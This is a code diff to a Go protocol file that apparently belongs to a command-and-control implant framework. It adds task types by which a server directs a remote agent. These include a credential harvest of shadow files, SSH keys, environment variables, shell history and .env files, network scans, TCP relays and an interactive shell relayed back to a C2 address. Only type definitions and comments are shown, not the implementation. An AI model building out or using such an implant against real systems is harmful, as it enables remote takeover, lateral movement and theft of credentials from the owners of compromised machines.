@@ -66,18 +66,28 @@ type Welcome struct {
 type TaskKind string
 
 const (
-	TaskExec     TaskKind = "exec"     // run a shell command; return combined stdout+stderr
-	TaskDownload TaskKind = "download" // read Path on the remote; return bytes in Output
-	TaskUpload   TaskKind = "upload"   // write Data to Path on the remote
+	TaskExec      TaskKind = "exec"      // run a shell command; return combined stdout+stderr
+	TaskDownload  TaskKind = "download"  // read Path on the remote; return bytes in Output
+	TaskUpload    TaskKind = "upload"    // write Data to Path on the remote
+	TaskSOCKS5    TaskKind = "socks5"    // (unused) legacy placeholder
+	TaskForward   TaskKind = "forward"   // TCP relay: dial Target, dial Relay, proxy data
+	TaskRecon     TaskKind = "recon"     // run OS-specific recon, return structured JSON
+	TaskScan      TaskKind = "scan"      // network scan: TCP-connect sweep of Target CIDR
+	TaskCreds     TaskKind = "creds"     // credential harvest: shadow, SSH keys, env, history, .env
+	TaskShell     TaskKind = "shell"     // interactive shell: agent starts shell, relays stdio to Relay addr
 )
 
 // Task is pushed by the server to the agent.
 type Task struct {
-	ID      string   `json:"id"`
-	Kind    TaskKind `json:"kind"`
-	Command string   `json:"command,omitempty"` // TaskExec
-	Path    string   `json:"path,omitempty"`    // TaskDownload / TaskUpload
-	Data    []byte   `json:"data,omitempty"`    // TaskUpload payload
+	ID        string   `json:"id"`
+	Kind      TaskKind `json:"kind"`
+	Command   string   `json:"command,omitempty"`   // TaskExec
+	Path      string   `json:"path,omitempty"`      // TaskDownload / TaskUpload
+	Data      []byte   `json:"data,omitempty"`      // TaskUpload payload
+	Target    string   `json:"target,omitempty"`    // TaskForward / TaskScan: CIDR or host:port
+	Relay     string   `json:"relay,omitempty"`     // TaskForward: C2 relay address agent dials back to
+	Ports     []int    `json:"ports,omitempty"`     // TaskScan: ports to probe (empty = defaults)
+	TimeoutMs int      `json:"timeout_ms,omitempty"` // TaskScan: per-connection timeout in ms
 }
 
 // Result is sent by the agent after completing a Task.
@@ -86,6 +96,7 @@ type Result struct {
 	Output []byte `json:"output"`
 	Error  string `json:"error,omitempty"`
 	Exit   int    `json:"exit"`
+	Port   int    `json:"port,omitempty"` // SOCKS5: bound port number
 }
 
 // WriteMsg serialises data as JSON, wraps it in a typed Envelope, and writes
